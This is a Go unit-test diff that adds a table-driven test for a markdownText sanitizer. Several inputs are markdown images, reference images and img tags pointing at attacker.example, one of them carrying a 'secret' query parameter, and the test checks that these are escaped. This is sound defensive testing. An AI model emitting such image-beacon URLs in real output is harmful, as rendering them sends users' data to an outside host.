@@ -37,6 +37,31 @@ func TestPlainText(t *testing.T) {
 	}
 }
 
+func TestMarkdownText(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{name: "plain text", in: "Raise the threshold.", want: "Raise the threshold."},
+		{name: "an image", in: "![x](https://attacker.example/p?d=secret)", want: `!\[x](https://attacker.example/p?d=secret)`},
+		{name: "an image by reference", in: "![x][ref]\n\n[ref]: https://attacker.example/p", want: `!\[x][ref]` + "\n\n[ref]: https://attacker.example/p"},
+		{name: "an img tag", in: `<img src="https://attacker.example/p">`, want: `&lt;img src="https://attacker.example/p">`},
+		{name: "a link stays", in: "[runbook](https://example.com/rb)", want: "[runbook](https://example.com/rb)"},
+		{name: "a mention and an image", in: "@octocat ![x](https://a.example/i)", want: "`@octocat` " + `!\[x](https://a.example/i)`},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			require.Equal(t, tt.want, markdownText(tt.in))
+		})
+	}
+}
+
 func TestOneLine(t *testing.T) {
 	t.Parallel()
 
